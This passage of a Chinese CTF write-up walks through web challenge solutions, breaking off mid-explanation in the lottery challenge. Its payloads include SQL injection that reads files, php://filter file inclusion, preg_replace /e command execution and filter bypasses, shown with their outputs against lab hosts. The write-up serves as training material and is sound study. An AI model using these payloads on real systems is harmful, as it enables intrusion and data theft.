<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段可以说明get没有做过滤，可以SSRF</p>
<p>更改一下，做SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;</span><br></pre></td></tr></table></figure>
<p>特别注意：++在URL中转译为空格，故也可以这么写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看返回列个数 &#x2F;view.php?no&#x3D;1++order++by++4</span><br></pre></td></tr></table></figure>


<h2 id="sql手工注入"><a href="#sql手工注入" class="headerlink" title="sql手工注入"></a>sql手工注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆列名 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;)),1)#</span><br><span class="line">爆字段 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select data from users)),1)#</span><br></pre></td></tr></table></figure>
<h2 id="fuzz测试"><a href="#fuzz测试" class="headerlink" title="fuzz测试"></a>fuzz测试</h2><p>fuzz测试也叫模糊测试，是一种黑盒测试。通过构造非法字段，观察被测试软件是否异常。</p>
<h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><p>kali下的fuzz测试工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆破文件</span><br><span class="line">wfuzz -w wordlist URL&#x2F;FUZZ.php</span><br><span class="line"></span><br><span class="line">爆破目录</span><br><span class="line">wfuzz -w wordlist URL&#x2F;FUZZ</span><br><span class="line"></span><br><span class="line">遍历枚举参数值</span><br><span class="line">wfuzz -z range,000-999 http:&#x2F;&#x2F;127.0.0.1&#x2F;getuser.php?uid&#x3D;FUZZ</span><br></pre></td></tr></table></figure>


<h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>考察：远程命令漏洞，Django，cURL</p>
<p>登录，只有一个输入域名的框，输入baidu.com&amp;ls，显示无效ip，因此判断是输入url</p>
<p>尝试输入127.0.0.1。</p>
<p>发现对127.0.0.1进行了ping，说明执行了命令</p>
<p>尝试以下简单命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p>失败，提示URL不合法。</p>
<p>观察URL，发现命令直接在URL处以GET方式提交。考虑URL解析ASCII码只到%3F，因此提交%FF</p>
<p>返回一个特别长的HTML代码，保存后用浏览器打开。</p>
<p>得到的信息有：该网页为Django框架；数据库绝对路径为/opt/apt/database.sqlite3</p>
<p>php通常使用cURL库作为客户端和服务端通信，因此输入以下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@&#x2F;opt&#x2F;apt&#x2F;database.sqlite3</span><br><span class="line"># 根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息</span><br></pre></td></tr></table></figure>
<p>又返回一长串html，用网页打开后搜索ctf，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHCTF&#123;yoooo_Such_A_G00D_@&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>Django目录下一般有一个settings.py用于设置网站数据库路径（默认使用sqlites)</p>
<p>所以也可以读取settings.py</p>
<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>考察：文件包含漏洞；PHP下远程调用命令行</p>
<p>首先进入网页，发现只有“设备维护中心可以进入”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php</span><br></pre></td></tr></table></figure>
<p>进入后，再点击左上角的云平台设备维护中心，URL变成如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php?page&#x3D;index</span><br></pre></td></tr></table></figure>
<p>此处为明显的文件注入漏洞，通过php://伪协议下载index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45075&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>下载出来后是base64编码，还原后得到index.php，关键函数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解读：如果HTTP_X_FOWARDED_FOR为127.0.0.1，则执行preg_replace。</p>
<p>首先在报文Header处添加X_Forwarded_For:127.0.0.1，得以看到“Welcome My Admin ! ”</p>
<p>然后根据preg_replace的/e漏洞，修改报文后发送，可以得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;ls&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1  </span><br><span class="line">&#x2F;*index.html</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">layui</span><br><span class="line">logo.png</span><br><span class="line">s3chahahaDir</span><br><span class="line">start.sh</span><br><span class="line">视图.png</span><br><span class="line">*&#x2F;</span><br><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;find+-iname+flag&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1 # # +在PHP的URL解析中代表空格</span><br><span class="line">&#x2F;*.&#x2F;s3chahahaDir&#x2F;flag*&#x2F;</span><br><span class="line">GET &#x2F;index.php?pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(&quot;cd+.&#x2F;s3chahahaDir&#x2F;flag%26%26+cat+flag.php&quot;)&amp;sub&#x3D;defg%20abc HTTP&#x2F;1.1 # %26在PHP的URL解析中代表&amp;，而在命令行中，&amp;&amp;代表前面的语句执行成功后，执行后面的语句</span><br><span class="line">&#x2F;*得到flag*&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;d46915710af3a6e405b68271d55edd82&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php # 可以以base64方式读取文件</span><br></pre></td></tr></table></figure>
<h2 id="PHP中preg-replace的-e漏洞"><a href="#PHP中preg-replace的-e漏洞" class="headerlink" title="PHP中preg_replace的/e漏洞"></a>PHP中preg_replace的/e漏洞</h2><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向 引用替换完之后）。 提示：要确保 replacement 构成一个合法的 PHP 代码字符串， 否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说只要在subject中有要搜索的pattern的内容，同时将在replacement前加上&#x2F;e，触发&#x2F;e漏洞，就可以执行replacement中的正确的php代码</span><br></pre></td></tr></table></figure>
<h1 id="favourite-number"><a href="#favourite-number" class="headerlink" title="favourite_number"></a>favourite_number</h1><p>考察：php的两个漏洞利用，tac</p>
<p>进入页面就是一段php代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;php5.5.9</span><br><span class="line">$stuff &#x3D; $_POST[&quot;stuff&quot;];</span><br><span class="line">$array &#x3D; [&#39;admin&#39;, &#39;user&#39;];</span><br><span class="line">if($stuff &#x3D;&#x3D;&#x3D; $array &amp;&amp; $stuff[0] !&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">    $num&#x3D; $_POST[&quot;num&quot;];</span><br><span class="line">    if (preg_match(&quot;&#x2F;^\d+$&#x2F;im&quot;,$num))&#123;</span><br><span class="line">        if (!preg_match(&quot;&#x2F;sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#39;|\&quot;|\|&#x2F;i&quot;,$num))&#123;</span><br><span class="line">            echo &quot;my favorite num is:&quot;;</span><br><span class="line">            system(&quot;echo &quot;.$num);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;Bonjour!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即首先要提交一个stuff，绕过stuff的检测，再提交一个num，num绕过preg_match的检测并执行命令</p>
<p>stuff绕过利用了php5.5.26的这个漏洞<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=69892">https://bugs.php.net/bug.php?id=69892</a></p>
<p>提交URL的post data为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1</span><br></pre></td></tr></table></figure>
<p>输出了1，接下来要绕过num的检测。接下来要绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;&#x2F;^\d+$&#x2F;im&quot;,$num)</span><br></pre></td></tr></table></figure>
<p>需要用%0a进行跨行匹配，故payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0als</span><br></pre></td></tr></table></figure>
<p>可以看到在根目录下有flag</p>
<p>由于cat有绕过，因此使用其他的查看文件方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法1：tcat+inode</span><br><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0atac ls -i ## 查看flag文件的inode号</span><br><span class="line">stuff[4294967296]&#x3D;admin&amp;stuff[1]&#x3D;user&amp;num&#x3D;1%0atac &#96;find &#x2F; -inum 38274922&#96; ## 反引号用于绕过单双引号过滤</span><br><span class="line">方法2：将文件名输入到文件，然后执行文件</span><br><span class="line">printf &#x2F;fla &gt; &#x2F;tmp&#x2F;hello &amp;&amp; printf g &gt;&gt; &#x2F;tmp&#x2F;hello &amp;&amp; tac &#96;tac &#x2F;tmp&#x2F;hello&#96;</span><br><span class="line">cyberpeace&#123;c4a2094df61c50b15a72dc9b97bc7716&#125; </span><br></pre></td></tr></table></figure>
<h2 id="php5-5-9的溢出漏洞"><a href="#php5-5-9的溢出漏洞" class="headerlink" title="php5.5.9的溢出漏洞"></a>php5.5.9的溢出漏洞</h2><p><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=69892">https://bugs.php.net/bug.php?id=69892</a></p>
<p>4294967296=2^32</p>
<h2 id="php下preg-match的绕过方法"><a href="#php下preg-match的绕过方法" class="headerlink" title="php下preg_match的绕过方法"></a>php下preg_match的绕过方法</h2><p>数组绕过：传入的对象是数组时，返回false</p>
<p>换行符绕过：.不匹配换行符，$会忽略句尾的%0a</p>
<h2 id="Linux下查看文件内容的方法"><a href="#Linux下查看文件内容的方法" class="headerlink" title="Linux下查看文件内容的方法"></a>Linux下查看文件内容的方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、nl</span><br></pre></td></tr></table></figure>
<p>当文件名也被注释时，使用inode可以索引文件</p>
<p>首先用ls -i查找flag编号</p>
<p>或者可以使用文件名输入到文件，然后执行文件的方法</p>
<h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>考察：代码审计</p>
<p>跳过了用githack下载的步骤，题目直接给出了源文件</p>
<p>审计文件，发现在api.php中出现了flag字样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag_price</span>;</span><br><span class="line"></span><br><span class="line">	require_registered();</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$flag_price</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;you don\&#x27; have enough money&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$money</span> -= <span class="variable">$flag_price</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">		<span class="variable">$msg</span> = <span class="string">&#x27;Here is your flag: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">		response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="variable">$msg</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而$money是一个session中的值，<strong>无法修改</strong></p>
<p>又找到了负责跳转的部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;buy&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;numbers&#x27;</span>]);</span><br><span class="line">		buy(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">		flag(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		register(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		response_error(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用burp抓包后，包类似于如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;api.php HTTP&#x2F;1.1</span><br><span class="line">Host: 220.249.52.134:51525</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http:&#x2F;&#x2F;220.249.52.134:51525&#x2F;buy.php</span><br><span class="line">Content-Length: 64</span><br><span class="line">Cookie: PHPSESSID&#x3D;teiedeaf2vra9rrn9ipttquv36</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;action&quot;:&quot;flag&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
<p>同时，在buy下，有这么一个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = random_win_nums();</span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑为“用钱买彩票”</p>
<p>而判断是否中奖，用的是php中的宽等于，因此可以使用</p>
